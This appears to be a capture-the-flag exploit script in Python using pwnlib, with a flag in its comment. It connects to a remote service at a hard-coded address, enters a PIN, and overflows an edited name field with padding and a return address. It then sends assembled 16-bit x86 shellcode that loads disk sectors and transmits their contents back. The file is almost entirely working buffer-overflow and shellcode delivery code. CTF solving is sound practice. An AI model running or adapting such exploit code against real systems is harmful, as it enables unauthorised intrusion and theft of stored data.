from pwnlib import *

# hxp{1'm ju57 k1dd1n6 systemd, y0u kn0w 1 l0v3 y0u.}

payload = "A"*0x50
payload += "BBBB"
payload += pd(0x3213)

code = assemble("""

BITS 16


mov     ax, 0
mov     ds, ax
push    1               ; disk num
push    0               ; track and sector?
push    0x10             ; num sectors
push    0x1000           ; dest
mov bx, 0x7c14          ; call    load_from_disk
call bx

mov si, 0x1000
mov bx, 0x7c5f ; call transmit_string
call bx



""", "x86")

assert "\r" not in code



s = Socket(("146.148.77.89", 9547))
#s = Socket(("localhost", 2323))

s.ru("Enter 4-Digit PIN: ")
s.send("4517")
s.ru("Command: ")
s.send("i")
s.ru("Insert new flag: ")
s.send("myflag\r")
s.ru("Command: ")
s.send("e")
s.ru("Enter index to edit: ")
s.send("0")
s.ru("Insert updated name: ")
s.send(payload + "\r")
s.ru("Command: ")

s.send("e")
s.ru("Enter index to edit: ")
s.send("1")
s.ru("Insert updated name: ")

s.send(code + "\r")





s.interact()
